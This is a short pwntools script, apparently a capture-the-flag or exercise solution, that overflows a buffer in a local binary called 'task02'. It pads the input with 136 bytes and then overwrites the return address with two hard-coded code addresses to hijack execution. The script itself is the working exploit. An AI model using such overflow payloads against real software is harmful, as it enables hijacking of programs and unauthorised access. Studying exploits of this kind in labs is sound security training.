from pwn import *


io = process("./task02")
io.recvuntil("What is your name?")
password = b'A' * 136 + p64(0x401189) + p64(0x4011DA)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break
io.kill()

# io.interactive()